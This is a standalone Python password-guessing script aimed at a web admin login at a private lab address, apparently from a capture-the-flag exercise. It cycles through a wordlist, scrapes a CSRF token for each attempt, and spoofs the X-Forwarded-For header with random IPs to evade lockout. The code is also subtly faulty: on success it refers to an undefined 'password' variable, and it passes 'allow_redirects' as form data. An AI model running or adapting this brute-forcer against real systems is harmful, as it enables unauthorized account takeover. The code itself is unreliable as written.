#!/usr/bin/env python3

import requests as r
import random
import sys
import re

targetUri = "http://10.10.10.191/admin/"
username = "admin"

def genRandomIp():
    return "192.168.1." + str(random.randint(0, 255))

def getCSRFToken():
    return re.search('input.+?name="tokenCSRF".+?value="(.+?)"', getPage().text).group(1)

def getPage():
    return r.get(targetUri)

def getWordListEntry():
    wordListFilePath = sys.argv[1]
    counter = 0
    with open(wordListFilePath, 'r') as wl:
        for entry in wl:
            counter += 1
            buildRequest(entry.rstrip(), counter)
    return

def launch(headers, params):
    return r.post(targetUri, headers=headers, data=params)

def buildRequest(entry, counter):
    headers = {"X-Forwarded-For": genRandomIp()}
    params = {"username": username, "password": entry, "tokenCSRF": getCSRFToken(), "save": "", "allow_redirects": False}
    print("[*] Try", counter, ":", entry)
    response = launch(headers, params)
    if 'location' in response.headers:
        print(response.headers["location"])
        if '/admin/dashboard' in response.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            return
    return

def main():
    print("Let\'s go!")
    getWordListEntry()

main()
